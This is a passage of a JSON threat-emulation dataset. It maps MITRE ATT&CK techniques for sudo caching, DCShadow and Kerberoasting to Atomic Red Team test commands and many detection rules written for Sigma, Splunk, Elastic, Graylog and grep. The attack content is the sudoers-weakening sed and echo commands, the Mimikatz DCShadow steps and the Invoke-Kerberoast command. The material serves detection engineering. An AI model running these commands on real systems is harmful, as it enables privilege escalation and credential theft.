/etc/sudoers\""], "technique_id": "T1206", "parsed_datasets": [{"Atomic Red Team Test - Sudo Caching": {"display_name": "Sudo Caching", "atomic_tests": [{"description": "Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.\n", "supported_platforms": ["macos", "linux"], "name": "Unlimited sudo cache timeout", "executor": {"command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers\nsudo visudo -c -f /etc/sudoers\n", "name": "sh"}}, {"description": "Sets sudo caching tty_tickets value to disabled. This is dangerous to modify without using 'visudo', do not do this on a production system.\n", "supported_platforms": ["macos", "linux"], "name": "Disable tty_tickets for sudo caching", "executor": {"command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"\nsudo visudo -c -f /etc/sudoers\n", "name": "sh"}}], "attack_technique": "T1206"}}], "queries": [{"query": "index=linux sourcetype=\"linux_audit\" sudoers_change", "product": "Splunk", "name": null}, {"query": "Audit Rule : -w /etc/sudoers -p wa -k sudoers_change", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1207", "parsed_datasets": [{"Atomic Red Team Test - DCShadow": {"display_name": "DCShadow", "atomic_tests": [{"description": "Utilize Mimikatz DCShadow method to simulate behavior of a Domain Controller\n\n[DCShadow](https://www.dcshadow.com/)\n[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)\n", "supported_platforms": ["windows"], "name": "DCShadow - Mimikatz", "executor": {"steps": "1. Start Mimikatz and use !processtoken (and not token::elevate - as it elevates a thread) to escalate to SYSTEM.\n2. Start another mimikatz with DA privileges. This is the instance which registers a DC and is used to \"push\" the attributes.\n3. lsadump::dcshadow /object:ops-user19$ /attribute:userAccountControl /value:532480\n4. lsadump::dcshadow /push\n", "name": "manual"}}], "attack_technique": "T1207"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1208/T1208.yaml", "command": "Import-Module .\\Invoke-Kerberoast.ps1\nInvoke-Kerberoast | fl\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/invoke_kerberoast", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/invoke_kerberoast", "name": "Empire Module Command"}], "command_list": ["Import-Module .\\Invoke-Kerberoast.ps1\nInvoke-Kerberoast | fl\n", "powershell/credentials/invoke_kerberoast", "powershell/credentials/invoke_kerberoast"], "technique_id": "T1208", "parsed_datasets": [{"Atomic Red Team Test - Kerberoasting": {"display_name": "Kerberoasting", "atomic_tests": [{"description": "This test uses the Powershell Empire Module: https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1\n\nThe following are further sources and credits for this attack:\n[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\n", "supported_platforms": ["windows"], "name": "Request for service tickets", "executor": {"elevation_required": false, "command": "Import-Module .\\Invoke-Kerberoast.ps1\nInvoke-Kerberoast | fl\n", "name": "powershell"}}], "attack_technique": "T1208"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1208", "Empire Module": "powershell/credentials/invoke_kerberoast", "Technique": "Kerberoasting", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/invoke_kerberoast\":  [\"T1208\"],"}}], "queries": [{"query": "title: Suspicious outbound Kerberos connection\nid: e54979bd-c5f9-4d6c-967b-a04b19ac4c74\nstatus: experimental\ndescription: Detects suspicious outbound network activity via kerberos default port indicating possible lateral movement or first stage PrivEsc via delegation.\nreferences:\n    - https://github.com/GhostPack/Rubeus8\nauthor: Ilyas Ochkov, oscd.community\ndate: 2019/10/24\nmodified: 2019/11/13\ntags:\n    - attack.lateral_movement\n    - attack.t1208\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 3\n        DestinationPort: 88\n        Initiated: 'true'\n    filter:\n        Image|endswith:\n            - '\\lsass.exe'\n            - '\\opera.exe'\n            - '\\chrome.exe'\n            - '\\firefox.exe'\n    condition: selection and not filter \nfalsepositives:\n    - Other browsers\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious outbound Kerberos connection\nid: e54979bd-c5f9-4d6c-967b-a04b19ac4c74\nstatus: experimental\ndescription: Detects suspicious outbound network activity via kerberos default port indicating possible lateral movement or first stage PrivEsc via delegation.\nreferences:\n    - https://github.com/GhostPack/Rubeus8\nauthor: Ilyas Ochkov, oscd.community\ndate: 2019/10/24\nmodified: 2019/11/13\ntags:\n    - attack.lateral_movement\n    - attack.t1208\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 3\n        DestinationPort: 88\n        Initiated: 'true'\n    filter:\n        Image|endswith:\n            - '\\lsass.exe'\n            - '\\opera.exe'\n            - '\\chrome.exe'\n            - '\\firefox.exe'\n    condition: selection and not filter \nfalsepositives:\n    - Other browsers\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"3\" AND DestinationPort:\"88\" AND Initiated:\"true\") AND (NOT (Image.keyword:(*\\\\\\\\lsass.exe OR *\\\\\\\\opera.exe OR *\\\\\\\\chrome.exe OR *\\\\\\\\firefox.exe))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-outbound-Kerberos-connection <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious outbound Kerberos connection\",\\n    \"description\": \"Detects suspicious outbound network activity via kerberos default port indicating possible lateral movement or first stage PrivEsc via delegation.\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1208\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"3\\\\\" AND DestinationPort:\\\\\"88\\\\\" AND Initiated:\\\\\"true\\\\\") AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\lsass.exe OR *\\\\\\\\\\\\\\\\opera.exe OR *\\\\\\\\\\\\\\\\chrome.exe OR *\\\\\\\\\\\\\\\\firefox.exe))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"3\\\\\" AND DestinationPort:\\\\\"88\\\\\" AND Initiated:\\\\\"true\\\\\") AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\lsass.exe OR *\\\\\\\\\\\\\\\\opera.exe OR *\\\\\\\\\\\\\\\\chrome.exe OR *\\\\\\\\\\\\\\\\firefox.exe))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious outbound Kerberos connection\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"3\" AND DestinationPort:\"88\" AND Initiated:\"true\") AND (NOT (Image.keyword:(*\\\\\\\\lsass.exe *\\\\\\\\opera.exe *\\\\\\\\chrome.exe *\\\\\\\\firefox.exe))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"3\" DestinationPort=\"88\" Initiated=\"true\") NOT ((Image=\"*\\\\\\\\lsass.exe\" OR Image=\"*\\\\\\\\opera.exe\" OR Image=\"*\\\\\\\\chrome.exe\" OR Image=\"*\\\\\\\\firefox.exe\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"3\" DestinationPort=\"88\" Initiated=\"true\")  -(Image IN [\"*\\\\\\\\lsass.exe\", \"*\\\\\\\\opera.exe\", \"*\\\\\\\\chrome.exe\", \"*\\\\\\\\firefox.exe\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*3)(?=.*88)(?=.*true)))(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\lsass\\\\.exe|.*.*\\\\opera\\\\.exe|.*.*\\\\chrome\\\\.exe|.*.*\\\\firefox\\\\.exe))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Register new logon process by Rubeus\nid: 12e6d621-194f-4f59-90cc-1959e21e69f7\ndescription: Detects potential use of Rubeus via registered new trusted logon process\nstatus: experimental\nreferences:\n    - https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1\ntags:\n    - attack.lateral_movement\n    - attack.privilege_escalation\n    - attack.t1208\nauthor: Roberto Rodriguez (source), Ilyas Ochkov (rule), oscd.community\ndate: 2019/10/24\nlogsource:\n    product: windows\n    service: security\n    definition: Ubnormal logon process name 'User32LogonProcesss' - with three 's' at the end\ndetection:\n    selection:\n        - EventID: 4611\n          LogonProcessName: 'User32LogonProcesss'\n    condition: selection\nfalsepositives:\n    - Unkown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Register new logon process by Rubeus\nid: 12e6d621-194f-4f59-90cc-1959e21e69f7\ndescription: Detects potential use of Rubeus via registered new trusted logon process\nstatus: experimental\nreferences:\n    - https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1\ntags:\n    - attack.lateral_movement\n    - attack.privilege_escalation\n    - attack.t1208\nauthor: Roberto Rodriguez (source), Ilyas Ochkov (rule), oscd.community\ndate: 2019/10/24\nlogsource:\n    product: windows\n    service: security\n    definition: Ubnormal logon process name 'User32LogonProcesss' - with three 's' at the end\ndetection:\n    selection:\n        - EventID: 4611\n          LogonProcessName: 'User32LogonProcesss'\n    condition: selection\nfalsepositives:\n    - Unkown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4611\" AND LogonProcessName:\"User32LogonProcesss\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Register-new-logon-process-by-Rubeus <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Register new logon process by Rubeus\",\\n    \"description\": \"Detects potential use of Rubeus via registered new trusted logon process\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1208\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4611\\\\\" AND LogonProcessName:\\\\\"User32LogonProcesss\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4611\\\\\" AND LogonProcessName:\\\\\"User32LogonProcesss\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Register new logon process by Rubeus\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4611\" AND LogonProcessName:\"User32LogonProcesss\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4611\" LogonProcessName=\"User32LogonProcesss\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4611\" logon_process=\"User32LogonProcesss\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4611)(?=.*User32LogonProcesss))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Possible SPN Enumeration\nid: 1eeed653-dbc8-4187-ad0c-eeebb20e6599\ndescription: Detects Service Principal Name Enumeration used for Kerberoasting\nstatus: experimental\nreferences:\n    - https://p16.praetorian.com/blog/how-to-use-kerberoasting-t1208-for-privilege-escalation\nauthor: Markus Neis, keepwatch\ndate: 2018/11/14\ntags:\n    - attack.credential_access\n    - attack.t1208\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_image:\n        Image: '*\\setspn.exe'\n    selection_desc:\n        Description: '*Query or reset the computer* SPN attribute*'\n    cmd:\n        CommandLine: '*-q*'\n    condition: (selection_image or selection_desc) and cmd\nfalsepositives:\n    - Administrator Activity\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Possible SPN Enumeration\nid: 1eeed653-dbc8-4187-ad0c-eeebb20e6599\ndescription: Detects Service Principal Name Enumeration used for Kerberoasting\nstatus: experimental\nreferences:\n    - https://p16.praetorian.com/blog/how-to-use-kerberoasting-t1208-for-privilege-escalation\nauthor: Markus Neis, keepwatch\ndate: 2018/11/14\ntags:\n    - attack.credential_access\n    - attack.t1208\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_image:\n        Image: '*\\setspn.exe'\n    selection_desc:\n        Description: '*Query or reset the computer* SPN attribute*'\n    cmd:\n        CommandLine: '*-q*'\n    condition: (selection_image or selection_desc) and cmd\nfalsepositives:\n    - Administrator Activity\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\setspn.exe OR Description.keyword:*Query\\\\ or\\\\ reset\\\\ the\\\\ computer*\\\\ SPN\\\\ attribute*) AND CommandLine.keyword:*\\\\-q*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Possible-SPN-Enumeration <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Possible SPN Enumeration\",\\n    \"description\": \"Detects Service Principal Name Enumeration used for Kerberoasting\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1208\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\setspn.exe OR Description.keyword:*Query\\\\\\\\ or\\\\\\\\ reset\\\\\\\\ the\\\\\\\\ computer*\\\\\\\\ SPN\\\\\\\\ attribute*) AND CommandLine.keyword:*\\\\\\\\-q*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\setspn.exe OR Description.keyword:*Query\\\\\\\\ or\\\\\\\\ reset\\\\\\\\ the\\\\\\\\ computer*\\\\\\\\ SPN\\\\\\\\ attribute*) AND CommandLine.keyword:*\\\\\\\\-q*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Possible SPN Enumeration\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\setspn.exe OR Description.keyword:*Query or reset the computer* SPN attribute*) AND CommandLine.keyword:*\\\\-q*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\setspn.exe\" OR Description=\"*Query or reset the computer* SPN attribute*\") CommandLine=\"*-q*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (Image=\"*\\\\\\\\setspn.exe\" OR Description=\"*Query or reset the computer* SPN attribute*\") CommandLine=\"*-q*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?:.*.*\\\\setspn\\\\.exe|.*.*Query or reset the computer.* SPN attribute.*)))(?=.*.*-q.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Kerberos RC4 Ticket Encryption\nid: 496a0e47-0a33-4dca-b009-9e6ca3591f39\nstatus: experimental\nreferences:\n    - https://adsecurity.org/?p=3458\n    - https://www.trimarcsecurity.com/single-post/TrimarcResearch/Detecting-Kerberoasting-Activity\ntags:\n    - attack.credential_access\n    - attack.t1208\ndescription: Detects service ticket requests using RC4 encryption type\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4769\n        TicketOptions: '0x40810000'\n        TicketEncryptionType: '0x17'\n    reduction:\n        - ServiceName: '$*'\n    condition: selection and not reduction\nfalsepositives:\n    - Service accounts used on legacy systems (e.g. NetApp)\n    - Windows Domains with DFL 2003 and legacy systems\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Kerberos RC4 Ticket Encryption\nid: 496a0e47-0a33-4dca-b009-9e6ca3591f39\nstatus: experimental\nreferences:\n    - https://adsecurity.org/?p=3458\n    - https://www.trimarcsecurity.com/single-post/TrimarcResearch/Detecting-Kerberoasting-Activity\ntags:\n    - attack.credential_access\n    - attack.t1208\ndescription: Detects service ticket requests using RC4 encryption type\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4769\n        TicketOptions: '0x40810000'\n        TicketEncryptionType: '0x17'\n    reduction:\n        - ServiceName: '$*'\n    condition: selection and not reduction\nfalsepositives:\n    - Service accounts used on legacy systems (e.g. NetApp)\n    - Windows Domains with DFL 2003 and legacy systems\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"4769\" AND TicketOptions:\"0x40810000\" AND TicketEncryptionType:\"0x17\") AND (NOT (ServiceName.keyword:$*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Kerberos-RC4-Ticket-Encryption <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Kerberos RC4 Ticket Encryption\",\\n    \"description\": \"Detects service ticket requests using RC4 encryption type\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1208\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"4769\\\\\" AND TicketOptions:\\\\\"0x40810000\\\\\" AND TicketEncryptionType:\\\\\"0x17\\\\\") AND (NOT (ServiceName.keyword:$*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"4769\\\\\" AND TicketOptions:\\\\\"0x40810000\\\\\" AND TicketEncryptionType:\\\\\"0x17\\\\\") AND (NOT (ServiceName.keyword:$*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Kerberos RC4 Ticket Encryption\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"4769\" AND TicketOptions:\"0x40810000\" AND TicketEncryptionType:\"0x17\") AND (NOT (ServiceName.keyword:$*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"4769\" TicketOptions=\"0x40810000\" TicketEncryptionType=\"0x17\") NOT (ServiceName=\"$*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" (event_id=\"4769\" ticket_options=\"0x40810000\" TicketEncryptionType=\"0x17\")  -(service=\"$*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*4769)(?=.*0x40810000)(?=.*0x17)))(?=.*(?!.*(?:.*(?:.*(?=.*\\\\$.*))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious outbound Kerberos connection\nid: eca91c7c-9214-47b9-b4c5-cb1d7e4f2350\nstatus: experimental\ndescription: Detects suspicious outbound network activity via kerberos default port indicating possible lateral movement or first stage PrivEsc via delegation.\nreferences:\n    - https://github.com/GhostPack/Rubeus8\nauthor: Ilyas Ochkov, oscd.community\ndate: 2019/10/24\nmodified: 2019/11/13\ntags:\n    - attack.lateral_movement\n    - attack.t1208\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5156\n        DestinationPort: 88\n    filter:\n        Image|endswith:\n            - '\\lsass.exe'\n            - '\\opera.exe'\n            - '\\chrome.exe'\n            - '\\firefox.exe'\n    condition: selection and not filter \nfalsepositives:\n    - Other browsers\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious outbound Kerberos connection\nid: eca91c7c-9214-47b9-b4c5-cb1d7e4f2350\nstatus: experimental\ndescription: Detects suspicious outbound network activity via kerberos default port indicating possible lateral movement or first stage PrivEsc via delegation.\nreferences:\n    - https://github.com/GhostPack/Rubeus8\nauthor: Ilyas Ochkov, oscd.community\ndate: 2019/10/24\nmodified: 2019/11/13\ntags:\n    - attack.lateral_movement\n    - attack.t1208\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5156\n        DestinationPort: 88\n    filter:\n        Image|endswith:\n            - '\\lsass.exe'\n            - '\\opera.exe'\n            - '\\chrome.exe'\n            - '\\firefox.exe'\n    condition: selection and not filter \nfalsepositives:\n    - Other browsers\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"5156\" AND DestinationPort:\"88\") AND (NOT (Image.keyword:(*\\\\\\\\lsass.exe OR *\\\\\\\\opera.exe OR *\\\\\\\\chrome.exe OR *\\\\\\\\firefox.exe))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-outbound-Kerberos-connection <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious outbound Kerberos connection\",\\n    \"description\": \"Detects suspicious outbound network activity via kerberos default port indicating possible lateral movement or first stage PrivEsc via delegation.\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1208\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"5156\\\\\" AND DestinationPort:\\\\\"88\\\\\") AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\lsass.exe OR *\\\\\\\\\\\\\\\\opera.exe OR *\\\\\\\\\\\\\\\\chrome.exe OR *\\\\\\\\\\\\\\\\firefox.exe))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"5156\\\\\" AND DestinationPort:\\\\\"88\\\\\") AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\lsass.exe OR *\\\\\\\\\\\\\\\\opera.exe OR *\\\\\\\\\\\\\\\\chrome.exe OR *\\\\\\\\\\\\\\\\firefox.exe))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious outbound Kerberos connection\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"5156\" AND DestinationPort:\"88\") AND (NOT (Image.keyword:(*\\\\\\\\lsass.exe *\\\\\\\\opera.exe *\\\\\\\\chrome.exe *\\\\\\\\firefox.exe))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"5156\" DestinationPort=\"88\") NOT ((Image=\"*\\\\\\\\lsass.exe\" OR Image=\"*\\\\\\\\opera.exe\" OR Image=\"*\\\\\\\\chrome.exe\" OR Image=\"*\\\\\\\\firefox.exe\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" (event_id=\"5156\" DestinationPort=\"88\")  -(Image IN [\"*\\\\\\\\lsass.exe\", \"*\\\\\\\\opera.exe\", \"*\\\\\\\\chrome.exe\", \"*\\\\\\\\firefox.exe\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*5156)(?=.*88)))(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\lsass\\\\.exe|.*.*\\\\opera\\\\.exe|.*.*\\\\chrome\\\\.exe|.*.*\\\\firefox\\\\.exe))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: User couldn't call a privileged service 'LsaRegisterLogonProcess'\nid: 6daac7fc-77d1-449a-a71a-e6b4d59a0e54\ndescription: The 'LsaRegisterLogonProcess' function verifies that the application making the function call is a logon process by checking that it has the SeTcbPrivilege\n    privilege set. Possible Rubeus tries to get a handle to LSA.\nstatus: experimental\nreferences:\n    - https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1\ntags:\n    - attack.lateral_movement\n    - attack.privilege_escalation\n    - attack.t1208\nauthor: Roberto Rodriguez (source), Ilyas Ochkov (rule), oscd.community\ndate: 2019/10/24\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        - 